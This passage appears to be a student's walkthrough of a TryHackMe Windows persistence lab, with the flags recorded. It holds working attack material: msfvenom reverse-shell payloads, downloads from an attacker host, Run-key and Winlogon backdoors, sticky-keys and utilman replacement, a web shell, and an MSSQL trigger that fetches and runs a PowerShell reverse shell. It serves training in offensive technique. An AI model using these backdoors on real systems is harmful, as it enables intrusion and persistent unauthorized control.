To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will useÂ `psexec`Â (available inÂ `C:\tools`) to open Regedit with SYSTEM privileges:

```shell-session
C:\> c:\tools\pstools\PsExec64.exe -s -i regedit
```

We will then delete the security descriptor for our task:

![Task Scheduler SD](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9a6dad473b19be313e3069da0a2fc937.png)

If we try to query our service again, the system will tell us there is no such task:

```shell-session
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```

If we start an nc listener in our attacker's machine, we should get a shell back after a minute:


```shell-session
user@AttackBox$ nc -lvp 4449
```

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)


Use the reverse shell obtained through the task scheduler and executeÂ `C:\flags\flag9.exe`Â to retrieve a flag.


Once we did all steps, we get a shell:

![Pasted image 20250515165131.png](../../../IMAGES/Pasted%20image%2020250515165131.png)

```
C:\flags>.\flag9.exe
THM{JUST_A_MATTER_OF_TIME}
```


# Logon Triggered Persistence
---

Some actions performed by a user might also be bound to executing specific payloads forÂ persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.

## Startup folder

Each user has a folder underÂ `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`Â where you can put executables to be run whenever the user logs in. An attacker can achieveÂ persistenceÂ just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.

If we want to force all users to run a payload while logging in, we can use the folder underÂ `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`Â in the same way.

For this task, let's generate a reverse shell payload using msfvenom:


```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

We will then copy our payload into the victim machine. You can spawn anÂ `http.server`Â with Python3 and use wget on the victim machine to pull your file:

|                                                                                                                                                      |     |                                                                                                                |
| ---------------------------------------------------------------------------------------------------------------------------------------------------- | --- | -------------------------------------------------------------------------------------------------------------- |
| AttackBox<br><br>```shell-session<br>user@AttackBox$ python3 -m http.server <br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... <br>``` | âžœ   | Powershell<br><br>```shell-session<br>PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe<br>``` |

We then store the payload into theÂ `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`Â folder to get a shell back for any user logging into the machine.

```shell-session
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Now be sure to sign out of your session from the start menu (closing theÂ RDPÂ window is not enough as it leaves your session open):

![sign out](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f0ba7fd44646d55c5505737642bdd96e.png)

And log back viaÂ RDP. You should immediately receive a connection back to your attacker's machine.

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Use your newly obtained shell to executeÂ `C:\flags\flag10.exe`Â and get your flag!


Once we follow all steps, we get a shell:

![Pasted image 20250515172104.png](../../../IMAGES/Pasted%20image%2020250515172104.png)

```
C:\flags>.\flag10.exe

THM{NO_NO_AFTER_YOU}
```

## Run / RunOnce

You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The registry entries underÂ `HKCU`Â will only apply to the current user, and those underÂ `HKLM`Â will apply to everyone. Any program specified under theÂ `Run`Â keys will run every time the user logs on. Programs specified under theÂ `RunOnce`Â keys will only be executed a single time.

For this task, let's create a new reverse shell with msfvenom:

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

After transferring it to the victim machine, let's move it toÂ `C:\Windows\`:

```shell-session
C:\> move revshell.exe C:\Windows
```

Let's then create aÂ `REG_EXPAND_SZ`Â registry entry underÂ `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. The entry's name can be anything you like, and the value will be the command we want to execute.

**Note:**Â While in a real-world set-up you could use any name for your registry entry, for this task you are required to useÂ `MyBackdoor`Â to receive the flag.

![backdoored Run entry](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/c99038cd6cc9e37512edabb1f873a4da.png)

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Using your newly obtained shell, executeÂ `C:\flags\flag11.exe`Â to get a flag!

Once we follow all steps, we will receive our shell, we need to strictly name the registry `MyBackdoor` for us to be able to read the flag:

![Pasted image 20250516113038.png](../../../IMAGES/Pasted%20image%2020250516113038.png)

```
C:\flags>.\flag11.exe
THM{LET_ME_HOLD_THE_DOOR_FOR_YOU}
```

## Winlogon

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys underÂ `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`Â that could be interesting to gainÂ persistence:

- `Userinit`Â points toÂ `userinit.exe`, which is in charge of restoring your user profile preferences.
- `shell`Â points to the system's shell, which is usuallyÂ `explorer.exe`.

![Winlogon registry](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/f3c2215af6e3f2d19313498fca62a9d4.png)

If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.

Let's start by creating a shell:

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will useÂ `C:\Windows`:

```shell-session
C:\> move revshell.exe C:\Windows
```

We then alter eitherÂ `shell`Â orÂ `Userinit`Â inÂ `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will useÂ `Userinit`, but the procedure withÂ `shell`Â is the same.

**Note:**Â While bothÂ `shell`Â andÂ `Userinit`Â could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to useÂ `Userinit`.

![Backdoored userinit](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/dc5fa3e75ff056f11e16c03373799f45.png)

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Using your newly obtained shell, executeÂ `C:\flags\flag12.exe`Â to get a flag!

```
wget http://10.14.21.28:8000/revshell.exe -O C:\Windows\revshell.exe

del C:\Windows\revshell.exe

c:\tools\pstools\PsExec64.exe -s -i regedit
```


Once we follow all steps, we get our shell:

![Pasted image 20250516113622.png](../../../IMAGES/Pasted%20image%2020250516113622.png)

```
C:\flags>.\flag12.exe
THM{I_INSIST_GO_FIRST}
```


## Logon scripts

One of the thingsÂ `userinit.exe`Â does while loading your user profile is to check for an environment variable calledÂ `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

Let's first create a reverse shell to use for this technique:

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will useÂ `C:\Windows`:

```shell-session
C:\> move revshell.exe C:\Windows
```

To create an environment variable for a user, you can go to itsÂ `HKCU\Environment`Â in the registry. We will use theÂ `UserInitMprLogonScript`Â entry to point to our payload so it gets loaded when the users logs in:

![Backdoored env](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/9ce41ee1fc282b8dcacd757b23417b12.png)

Notice that this registry key has no equivalent inÂ `HKLM`, making your backdoor apply to the current user only.

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Using your newly obtained shell, executeÂ `C:\flags\flag13.exe`Â to get a flag

Once we did all steps, we get a shell:

![Pasted image 20250516114216.png](../../../IMAGES/Pasted%20image%2020250516114216.png)

```
C:\flags> .\flag13.exe
THM{USER_TRIGGERED_PERSISTENCE_FTW}
```

# Backdooring the Login Screen / RDP
---

If we have physical access to the machine (orÂ RDPÂ in our case), you can backdoor the login screen to access a terminal without having valid credentials for a machine.

We will look at two methods that rely on accessibility features to this end.

## Sticky Keys

When pressing key combinations likeÂ `CTRL + ALT + DEL`, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time. In that sense, if sticky keys are active, you could press and releaseÂ `CTRL`, press and releaseÂ `ALT`Â and finally, press and releaseÂ `DEL`Â to achieve the same effect as pressing theÂ `CTRL + ALT + DEL`Â combination.

To establishÂ persistenceÂ using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressingÂ `SHIFT`Â 5 times. After inputting the shortcut, we should usually be presented with a screen that looks as follows:

![sticky keys](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/27e711818bea549ace3cf85279f339c8.png)

After pressingÂ `SHIFT`Â 5 times, Windows will execute the binary inÂ `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials.

A straightforward way to backdoor the login screen consists of replacingÂ `sethc.exe`Â with a copy ofÂ `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the logging screen.

To overwriteÂ `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy ofÂ `cmd.exe`. We can do so with the following commands:


```shell-session
C:\> takeown /f c:\Windows\System32\sethc.exe

SUCCESS: The file (or folder): "c:\Windows\System32\sethc.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\sethc.exe /grant Administrator:F
processed file: C:\Windows\System32\sethc.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
Overwrite C:\Windows\System32\sethc.exe? (Yes/No/All): yes
        1 file(s) copied.
```

After doing so, lock your session from the start menu:

![lock session](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/2faf2bec5763297beb7c921858900c57.png)

You should now be able to pressÂ `SHIFT`Â five times to access a terminal with SYSTEM privileges directly from the login screen:

![sethc backdoor](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/5062148957ec1d70dccd080bdca93ddf.png)

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)


From your newly obtained terminal, executeÂ `C:\flags\flag14.exe`Â to get your flag!


Once we do all steps, we get our cmd:

![Pasted image 20250516114751.png](../../../IMAGES/Pasted%20image%2020250516114751.png)

Let's read our flag:

![Pasted image 20250516114855.png](../../../IMAGES/Pasted%20image%2020250516114855.png)

```
THM{BREAKING_THROUGH_LOGIN}
```

## Utilman

Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

![utilman](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/73c7698a015de5a988fd815ff3e41473.png)

When we click the ease of access button on the login screen, it executesÂ `C:\Windows\System32\Utilman.exe`Â with SYSTEM privileges. If we replace it with a copy ofÂ `cmd.exe`, we can bypass the login screen again.

To replaceÂ `utilman.exe`, we do a similar process to what we did withÂ `sethc.exe`:

```shell-session
C:\> takeown /f c:\Windows\System32\utilman.exe

SUCCESS: The file (or folder): "c:\Windows\System32\utilman.exe" now owned by user "PURECHAOS\Administrator".

C:\> icacls C:\Windows\System32\utilman.exe /grant Administrator:F
processed file: C:\Windows\System32\utilman.exe
Successfully processed 1 files; Failed processing 0 files

C:\> copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
Overwrite C:\Windows\System32\utilman.exe? (Yes/No/All): yes
        1 file(s) copied.
```

To trigger our terminal, we will lock our screen from the start button:

![lock session](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/1f94b28361ffebbf70d280755821bc12.png)

And finally, proceed to click on the "Ease of Access" button. Since we replacedÂ `utilman.exe`Â with aÂ `cmd.exe`Â copy, we will get a command prompt with SYSTEM privileges:

![backdoored utilman](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/0fe1901296108241e2700abf87fa6a27.png)

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

From your newly obtained terminal, executeÂ `C:\flags\flag15.exe`Â to get your flag


Once we do all steps, when we click on the utilman, we will get our shell:

![Pasted image 20250516115028.png](../../../IMAGES/Pasted%20image%2020250516115028.png)

Let's get our flag:

![Pasted image 20250516115121.png](../../../IMAGES/Pasted%20image%2020250516115121.png)

```
THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}
```

# Persisting Through Existing Services
---

If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you. This task will look at how to plant backdoors in a typical web server setup. Still, any other application where you have some degree of control on what gets executed should be backdoorable similarly. The possibilities are endless!

## Using Web Shells

The usual way of achievingÂ persistenceÂ in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in IIS, which by default isÂ `iis apppool\defaultapppool`. Even if this is an unprivileged user, it has the specialÂ `SeImpersonatePrivilege`, providing an easy way to escalate to the Administrator using various known exploits. For more information on how to abuse this privilege, see theÂ [Windows Privesc Room](https://tryhackme.com/room/windowsprivesc20).

Let's start by downloading an ASP.NET web shell. A ready to use web shell is providedÂ [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in theÂ `C:\inetpub\wwwroot`Â directory:


```shell-session
C:\> move shell.aspx C:\inetpub\wwwroot\
```

**Note:**Â Depending on the way you create/transferÂ `shell.aspx`, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so withÂ `icacls shell.aspx /grant Everyone:F`.

We can then run commands from the web server by pointing to the following URL:

`http://10.10.173.151/shell.aspx`

![web shell](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/d9845057ebf54a61401ca61c2c268fe8.png)

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Use your web shell to executeÂ `C:\flags\flag16.exe`Â to get your flag!

While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.


Once we follow all steps, we receive our webshell:

![Pasted image 20250516120044.png](../../../IMAGES/Pasted%20image%2020250516120044.png)

Let's read our flag:

![Pasted image 20250516120111.png](../../../IMAGES/Pasted%20image%2020250516120111.png)

```
THM{EZ_WEB_PERSISTENCE}
```

## Using MSSQL as a Backdoor


There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. Simply put,Â **triggers**Â in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. For this task, we will create a trigger for any INSERT into theÂ `HRDB`Â database.

Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable theÂ `xp_cmdshell`Â stored procedure.Â `xp_cmdshell`Â is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.

To enable it, let's openÂ `Microsoft SQL Server Management Studio 18`, available from the start menu. When asked for authentication, just useÂ **Windows Authentication**Â (the default value), and you will be logged on with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.

Once logged in, click on theÂ **New Query**Â button to open the query editor:

![New SQL query](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/eb3aaca1ed1da7d1e08f0c3069a5633a.png)

Run the followingÂ SQLÂ sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enableÂ `xp_cmdshell`.

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

After this, we must ensure that any website accessing the database can runÂ `xp_cmdshell`. By default, only database users with theÂ `sysadmin`Â role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate theÂ `sa`Â user, which is the default database administrator:

```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

After all of this, we finally configure a trigger. We start by changing to theÂ `HRDB`Â database:

```sql
USE HRDB
```

Our trigger will leverageÂ `xp_cmdshell`Â to execute Powershell to download and run aÂ `.ps1`Â file from a web server controlled by the attacker. The trigger will be configured to execute whenever anÂ `INSERT`Â is made into theÂ `Employees`Â table of theÂ `HRDB`Â database:

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
```

Now that the backdoor is set up, let's createÂ `evilscript.ps1`Â in our attacker's machine, which will contain aÂ PowershellÂ reverse shell:

```powershell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};

$client.Close()
```

We will need to open two terminals to handle the connections involved in this exploit:

- The trigger will perform the first connection to download and executeÂ `evilscript.ps1`. Our trigger is using port 8000 for that.
- The second connection will be a reverse shell on port 4454 back to our attacker machine.

| AttackBox<br><br>python3 -m http.server <br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... <br> | AttackBox<br><br>nc -lvp 4454<br>Listening on 0.0.0.0 4454<br> |
| ------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------- |

With all that ready, let's navigate toÂ `http://10.10.173.151/`Â and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.

![THM flag](https://tryhackme-images.s3.amazonaws.com/user-uploads/5ed5961c6276df568891c3ea/room-content/362875749378007cc447a2e47d476c9b.png)

Use your web shell to executeÂ `C:\flags\flag17.exe`Â to get your flag!

Once we did all steps, we need to add an employee to get our shell:

![Pasted image 20250516120626.png](../../../IMAGES/Pasted%20image%2020250516120626.png)

Let's add one and check our listener:

![Pasted image 20250516120648.png](../../../IMAGES/Pasted%20image%2020250516120648.png)

![Pasted image 20250516120855.png](../../../IMAGES/Pasted%20image%2020250516120855.png)

There we go, let's read our flag:

```
PS C:\Windows\system32> C:\flags\flag17.exe
THM{I_LIVE_IN_YOUR_DATABASE}
```

# Conclusion
---

In this room, we have covered the primary methods used by attackers to establishÂ persistenceÂ on a machine. You could sayÂ persistenceÂ is the art of planting backdoors on a system while going undetected for as long as possible without raising suspicion. We have seenÂ persistenceÂ methods that rely on different operating system components, providing various ways to achieve long-term access to a compromised host.

While we have shown several techniques, we have only covered a small fraction of those discovered. If you are interested in learning other techniques, the following resources are available:

- [Hexacorn - WindowsÂ Persistence](https://www.hexacorn.com/blog/category/autostart-persistence/)
- [PayloadsAllTheThings - WindowsÂ Persistence](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md)Â   
- [Oddvar Moe - WindowsÂ PersistenceÂ Through RunOnceEx](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/)Â Â 
- [PowerUpSQL](https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/)



